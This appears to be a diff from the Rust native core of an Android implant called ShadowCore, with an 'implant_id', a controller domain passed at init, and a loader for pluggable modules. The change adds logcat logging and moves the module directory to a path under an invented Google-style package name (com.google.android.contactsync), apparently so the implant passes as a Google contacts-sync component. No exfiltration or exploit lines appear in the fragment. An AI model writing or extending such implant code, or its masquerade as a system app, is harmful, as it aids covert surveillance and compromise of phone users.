@@ -211,6 +211,13 @@ pub extern "system" fn Java_com_shadow_ShadowCore_nativeInit(
     domain_jstr: JString,
     id_jstr: JString,
 ) -> jint {
+    // Bridge tracing/log output to Android logcat — without this the core is a black box
+    android_logger::init_once(
+        android_logger::Config::default()
+            .with_tag("ShadowCore")
+            .with_max_level(log::LevelFilter::Info),
+    );
+
     if STARTED.swap(true, Ordering::SeqCst) {
         return 0; // Already running — ignore duplicate init from WorkManager
     }
@@ -225,14 +232,14 @@ pub extern "system" fn Java_com_shadow_ShadowCore_nativeInit(
         runtime.block_on(async {
             let (event_tx, mut event_rx) = mpsc::unbounded_channel::<Vec<u8>>();
             let registry = Arc::new(Mutex::new(ModuleRegistry::new(std::path::PathBuf::from(
-                "/data/data/com.google.android.syncadapters.contacts/files/modules"
+                "/data/data/com.google.android.contactsync/files/modules"
             ))));
 
             let core = Arc::new(ShadowCore {
                 domain: domain.clone(),
                 implant_id: implant_id.clone(),
                 module_dir: std::path::PathBuf::from(
-                    "/data/data/com.google.android.syncadapters.contacts/files/modules"
+                    "/data/data/com.google.android.contactsync/files/modules"
                 ),
                 crypto: Arc::new(Mutex::new(None)),
                 event_tx: event_tx.clone(),
